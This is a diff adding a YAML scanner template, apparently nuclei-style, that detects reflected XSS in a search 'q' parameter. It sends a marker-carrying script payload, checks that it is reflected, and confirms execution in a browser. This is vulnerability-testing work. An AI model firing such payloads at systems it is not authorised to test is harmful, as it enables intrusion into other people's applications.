@@ -1,0 +1,53 @@
+id: reflected-xss-search-q
+info:
+  name: Reflected XSS in search 'q' parameter
+  severity: high
+  description: The 'q' parameter is reflected unescaped into the HTML response.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+  cwe: CWE-79
+  tags: [xss, reflected]
+
+variables:
+  - name: target
+    description: Base URL of the vulnerable app
+    required: true
+  - name: param
+    default: q
+    description: Reflected query parameter
+  - name: marker
+    default: "{{rand_text_alpha(8)}}"
+    description: Unique marker to confirm script execution
+  - name: payload
+    default: "<script>window.__aitm='{{marker}}'</script>"
+    description: XSS payload carrying the marker
+
+steps:
+  # 1. Send the injection and confirm the payload is reflected in the HTML.
+  - http:
+      method: GET
+      url: "{{target}}/search?{{param}}={{url_encode(payload)}}"
+      matchers-condition: and
+      matchers:
+        - type: status
+          status: 200
+        - type: word
+          part: body
+          word: "window.__aitm='{{marker}}'"
+
+  # 2. Drive the browser to the same URL and confirm the script actually executed.
+  - browser:
+      action: navigate
+      url: "{{target}}/search?{{param}}={{url_encode(payload)}}"
+  - browser:
+      action: screenshot
+      label: xss-triggered
+
+success:
+  all:
+    - type: word
+      part: body
+      word: "window.__aitm='{{marker}}'"
+    - type: browser-eval
+      expr: "window.__aitm"
+      equals: "{{marker}}"     # marker observed in the live page == script ran
